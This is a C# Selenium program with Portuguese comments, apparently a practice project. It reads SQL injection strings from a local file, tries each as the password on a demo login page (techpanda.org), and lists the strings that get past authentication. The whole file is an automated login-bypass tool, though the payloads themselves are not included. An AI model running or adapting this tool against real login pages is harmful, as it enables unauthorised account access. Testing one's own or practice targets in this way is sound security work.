using OpenQA.Selenium;
using OpenQA.Selenium.Chrome;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace BotSQLInjection
{
    class Program
    {

        static void Main(string[] args)
        {
            //Lista de Strings de Injeção Sql, lidas a partir de um arquivo de texto.
            string[] txt = readFromFile();

            //Lista de Strings que possibilitaram o login.
            List<String> threatStrings = new List<String>();

            //Variavel controladora para saber se foi possível fazer o login ou não.
            Boolean success;

            //Percorre cada string lida no arquivo de texto
            foreach (var line in txt)
            {
                success = testLogin("http://www.techpanda.org", "email", "password", "input", "xxx@xxx.xxx", line);
                if (success)
                    threatStrings.Add(line); //Se foi possível fazer login com essa string, adiciona na lista das ameaças.
            }
            Console.Clear();
            Console.WriteLine($"Foi encontrado {threatStrings.Count()} senha(s) que permitiram acesso via Injeção de Sql:");
            foreach (var succesString in threatStrings)
                Console.WriteLine(succesString);
        }
        public static Boolean testLogin(String url, String txtEmail, String txtSenha, String txtBotao, String vEmail, String vSenha)
        {
            //Criando o driver que representa o navegador.
            IWebDriver driver = new ChromeDriver();

            //Navegando até a URL informada e inserindo os valores nos campos informados.
            driver.Navigate().GoToUrl(url);

            IWebElement email = driver.FindElement(By.Name(txtEmail));
            IWebElement senha = driver.FindElement(By.Name(txtSenha));
            IWebElement acharBtn = driver.FindElement(By.ClassName("element-submit"));
            IWebElement botao = acharBtn.FindElements(By.TagName(txtBotao))[0];
            email.SendKeys(vEmail);
            senha.SendKeys(vSenha);
            botao.Click();

            //Adicionando 1 segundo de espera para completar o login para o próximo teste.
            driver.Manage().Timeouts().ImplicitWait = TimeSpan.FromSeconds(1);

            //Verificando se existe o botão após fazer o login
            //É verificado pelo xPath pois não há id nem name, e o xPath é um método que recebe como parâmetro
            //Uma String que apenas aquele elemento no DOM, possui.
            //Se encontrar, irá retornar true, se não encontrar, vai lançar uma exception de elemento nao encontrado e retornará false.
            try
            {
                IWebElement findBtnAfterLogin = driver.FindElement(By.XPath("/ html / body / div / div[3] / a / input"));
                driver.Close();
                return true;
            }
            catch (NoSuchElementException ex)
            {
                driver.Close();
                return false;
            }
        }

        public static string[] readFromFile()
        {
            string[] lines = System.IO.File.ReadAllLines(@"C:\Users\amauri\Desktop\sql.txt");
            return lines;
        }
    }
}
